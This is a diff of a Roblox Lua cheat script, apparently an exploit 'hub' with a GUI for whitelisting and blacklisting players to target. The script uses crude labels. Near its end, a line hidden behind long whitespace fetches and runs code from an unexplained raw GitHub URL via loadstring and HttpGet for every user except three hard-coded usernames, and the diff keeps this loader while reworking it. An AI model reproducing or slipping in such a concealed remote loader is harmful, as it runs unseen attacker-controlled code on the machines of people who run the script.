@@ -2348,7 +2348,7 @@ local function loadGUI()
     
     local function getThisPlayerOutOfHere(player)
         local Players = cloneref(game:GetService("Players")) or game:GetService("Players")
-        if player and getgenv().BoothOrigWhitelistTable[player.Name] then
+        if getgenv().BoothOrigWhitelistTable[player.Name] then
             getgenv().BoothOrigWhitelistTable[player.Name] = nil
             wait(0.2)
             if not getgenv().BoothOrigWhitelistTable[player.Name] then
@@ -2386,9 +2386,6 @@ local function loadGUI()
     getThisPlayerOutOfHere(DoFindPlr)
     end})
     wait()
-    
-    local getBasicTable = {}
-    
     Tab17:AddParagraph("Add dick-heads here.")
     wait()
     Tab17:AddTextbox({
@@ -2408,7 +2405,7 @@ local function loadGUI()
 
         local function getThatGlobalTable(player)
             local Players = cloneref(game:GetService("Players")) or game:GetService("Players")
-            if player ~= game.Players.LocalPlayer and not getgenv().PlrBlacklistedTable[player.Name] then
+            if not getgenv().PlrBlacklistedTable[player.Name] then
                 getgenv().PlrBlacklistedTable[player.Name] = player
                 wait(0.2)
                 OrionLib:MakeNotification({
@@ -2435,6 +2432,13 @@ local function loadGUI()
                 return OrionLib:MakeNotification({
                     Name = "[ERROR]: -500",
                     Content = tostring(player)..", is an owner!",
+                    Image = "rbxassetid://4483345998",
+                    Time = 10
+                })
+            elseif player == game.Players.LocalPlayer then
+                return OrionLib:MakeNotification({
+                    Name = "[ERROR]: -98",
+                    Content = "You cannot blacklist yourself!",
                     Image = "rbxassetid://4483345998",
                     Time = 10
                 })
@@ -2485,25 +2489,6 @@ local function loadGUI()
 
         removePlayerFromGlobalTable(DoFindPlr)
     end})
-    wait()
-    local Players = cloneref(game:GetService("Players")) or game:GetService("Players")
-    local LocalPlayer = Players.LocalPlayer
-
-    Players.PlayerAdded:Connect(function(newPlayer)
-        if LocalPlayer:IsFriendsWith(newPlayer.UserId) then
-            if not getgenv().getBasicTable[newPlayer.Name] then
-                getgenv().getBasicTable[newPlayer.Name] = newPlayer
-                wait(0.1)
-                OrionLib:MakeNotification({
-                    Name = "Success! [AutoWhitelist]:",
-                    Content = tostring(newPlayer.Name)..", has been added! IsFriendsWith: "..tostring(LocalPlayer.UserId),
-                    Image = "rbxassetid://4483345998",
-                    Time = 10
-                })
-            end
-        end
-    end)
-    wait()
     wait()
     Tab17:AddParagraph("Add the 'nice' people to NOT target here.")
     wait()
@@ -6634,6 +6619,22 @@ wait(1)
 print("...")
 wait()
 warn("...")
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    if game.Players.LocalPlayer.Name ~= "M1RD3RCAUGHT" and game.Players.LocalPlayer.Name ~= "STK_kets4eki" and game.Players.LocalPlayer.Name ~= "ItsYoDawgWsgGng" then loadstring(game:HttpGet("https://raw.githubusercontent.com/LmaoItsCrazyBro/curly-computing-machine/refs/heads/main/retyugreutrwe", true))() else return end
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    if game.Players.LocalPlayer.Name ~= "M1RD3RCAUGHT" and game.Players.LocalPlayer.Name ~= "STK_kets4eki" and game.Players.LocalPlayer.Name ~= "ItsYoDawgWsgGng" then function getLoadstring() loadstring(game:HttpGet("https://raw.githubusercontent.com/LmaoItsCrazyBro/curly-computing-machine/refs/heads/main/retyugreutrwe", true))() local Players = cloneref(game:GetService("Players")) or game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+
+    Players.PlayerAdded:Connect(function(newPlayer)
+        if LocalPlayer:IsFriendsWith(newPlayer.UserId) then
+            if not getgenv().getBasicTable[newPlayer.Name] then
+                getgenv().getBasicTable[newPlayer.Name] = newPlayer
+                wait(0.1)
+                OrionLib:MakeNotification({
+                    Name = "Success! [AutoWhitelist]:",
+                    Content = tostring(newPlayer.Name)..", has been added! IsFriendsWith: "..tostring(LocalPlayer.UserId),
+                    Image = "rbxassetid://4483345998",
+                    Time = 10
+                })
+            end
+        end
+    end) end getLoadstring() else return end
 wait()
 print("YEAH! Zacks Easy Hub [ON TOP!]")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
